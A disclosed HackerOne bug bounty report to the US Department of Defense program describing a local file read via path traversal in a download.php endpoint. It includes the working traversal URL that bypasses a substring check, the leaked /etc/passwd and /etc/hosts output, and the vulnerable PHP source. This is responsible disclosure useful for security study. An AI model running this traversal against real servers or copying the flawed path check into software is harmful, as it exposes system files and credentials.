# Local file read at https://████/ [HtUS]

## Report Details
- **Report ID**: 1626210
- **URL**: https://hackerone.com/reports/1626210
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-07-05T14:02:01.113Z
- **Disclosed**: 2022-10-14T13:51:37.555Z

## Reporter
- **Username**: sudi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Heyy there,
I have found local file read vulnerability in your website https://█████/

This the vulnerable endpoint https://██████████/download.php?filePathDownload=data_products and the `filePathDownload` path is vulnerable which allows an attacker to read any local files.

There was some sort protection when I first checked this endpoint, as it was returning 403 forbidden status code, upon trying something similar as the hacker has shown in report #1542734 . But I was able to bypass the protection in place.


---------------------

**Steps to reproduce:**

Just visit this url , which will display the contents of the `/etc/passwd` file:

https://████████/download.php?filePathDownload=data_products/../../../../../etc/passwd


Response:

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:998:995::/var/lib/chrony:/sbin/nologin
ec2-user:x:1000:1000:Cloud User:/home/ec2-user:/bin/bash
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
sssd:x:995:993:User for sssd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sustainment:x:1001:1001::/home/sustainment:/bin/bash
emerg:x:1002:1002:Sustainment Linux Emergency Acct:/home/emerg:/bin/bash
cwagent:x:993:992::/home/cwagent:/bin/bash
ssm-user:x:1003:1004::/home/ssm-user:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
drupal:x:1004:1005::/home/drupal:/bin/bash
splunk:x:1005:1006:Splunk Server:/opt/splunkforwarder:/bin/bash
mfe:x:992:1007::/home/mfe:/sbin/nologin
aoc:x:991:991:AWS OTel Collector:/home/aoc:/sbin/nologin
```



Also the content of `/etc/hosts`

```
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6

████ ███████
████████
███████
███████
█████████
██████████
████████

```



You can also read the source code for the available php files such as index.php,download.php

Here's the source code for `download.php`
https://█████/download.php?filePathDownload=data_products/../download.php

```php
<?php

function checkPath($path){

  if(!contains($path, "data_products")){

    ob_clean();
    http_response_code(403);
	throw new RuntimeException('File Not Found Error');  
    exit();
    
  }
		
	
}

function startsWith( $haystack, $needle ) {
     $length = strlen( $needle );
     return substr( $haystack, 0, $length ) === $needle;
}

function contains( $haystack, $needle ) {
     return strpos($haystack, $needle) !== false;
}

if(isset($_REQUEST["file"]) && isset($_REQUEST['linkpath'])){
 $linkpath=$_REQUEST['linkpath'];
    echo $file = htmlspecialchars(urldecode(base64_decode($_REQUEST["file"]))); // Decode URL-encoded string
    echo   $filepath =  $linkpath.'/'.$file;
    checkPath($filepath);
    if(is_file($filepath)){
                    ob_clean();
                    header("Pragma: public");
                    header("Expires: 0");
                    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
                    header("Cache-Control: private",false);
                   //header('Content-Type: application/pdf');
                    header('Content-Type: application/octet-stream');
                    header("Content-Disposition: attachment; filename=\"".basename($filepath)."\";");
                    header("Content-Transfer-Encoding: binary");
                    header("Content-Length: ".filesize($filepath));
                    readfile($filepath);
    }else{
    echo 'File Not Found ';
    }
}
if(isset($_REQUEST["filedownload"])){

   echo  $filepath = htmlspecialchars(urldecode(base64_decode($_REQUEST["filedownload"]))); // Decode URL-encoded string
   die;//  $filepath = $_REQUEST["filedownload"];
   checkPath($filepath);
    if(is_file($filepath)){
                    ob_clean();
                    header("Pragma: public");
                    header("Expires: 0");
                    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
                    header("Cache-Control: private",false);
                    header('Content-Type: application/octet-stream');
                    header("Content-Disposition: attachment; filename=\"".basename($filepath)."\";");
                    header("Content-Transfer-Encoding: binary");
                    header("Content-Length: ".filesize($filepath));
                    readfile($filepath);
    }else{
    echo 'File Not Found ';
    }
}

if(isset($_REQUEST["filePathDownload"])){

   echo  $filepath = htmlspecialchars(urldecode($_REQUEST["filePathDownload"]));
    checkPath($filepath);
     
    if(is_file($filepath)){
                    ob_clean();
                    header("Pragma: public");
                    header("Expires: 0");
                    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
                    header("Cache-Control: private",false);
                    header('Content-Type: application/octet-stream');
                    header("Content-Disposition: attachment; filename=\"".basename($filepath)."\";");
                    header("Content-Transfer-Encoding: binary");
                    header("Content-Length: ".filesize($filepath));
                    readfile($filepath);
    }else{
    echo 'File Not Found ';
    }
}

?>
```


-----------------

## Impact

Impact:

An attacker can read any local files,I haven't looked much into the local files but as there many users in the system I might be able to get access to something very sensitive.

Thankyou
Regards
Sudhanshu

## Attachments
No attachments
